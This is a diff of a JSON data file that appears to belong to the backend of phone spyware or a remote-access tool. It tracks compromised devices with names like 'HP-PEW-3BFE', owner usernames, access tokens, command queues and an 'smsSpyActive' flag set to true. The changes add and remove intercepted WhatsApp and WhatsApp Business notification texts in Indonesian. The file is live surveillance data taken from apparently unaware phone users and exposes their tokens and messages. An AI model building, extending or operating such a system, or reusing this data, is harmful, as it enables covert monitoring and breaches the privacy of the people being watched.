@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776957437505,
+    "lastSeen": 1776957464811,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎72 pesan dari 41 chat",
+        "time": "23/04 23:17",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776957465300
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -4011,14 +4019,6 @@
         "time": "23/04 20:43",
         "pkg": "com.whatsapp",
         "receivedAt": 1776948225431
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎66 pesan dari 43 chat",
-        "time": "23/04 20:43",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776948182556
       }
     ],
     "galleryPhotos": [],
@@ -16669,7 +16669,7 @@
     "deviceName": "HP-XXX-2D24",
     "ownerUsername": "is",
     "token": "34abd4f14a5676f3cd2d30b18941c847",
-    "lastSeen": 1776957435792,
+    "lastSeen": 1776957441300,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-23T15:09:35.885Z",
@@ -16685,6 +16685,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WA Business",
+        "sender": "WhatsApp Business",
+        "content": "Anda mungkin telah menerima pesan baru",
+        "time": "23/04 22:17",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1776957439783
+      },
       {
         "appName": "WA Business",
         "sender": "WhatsApp Business",
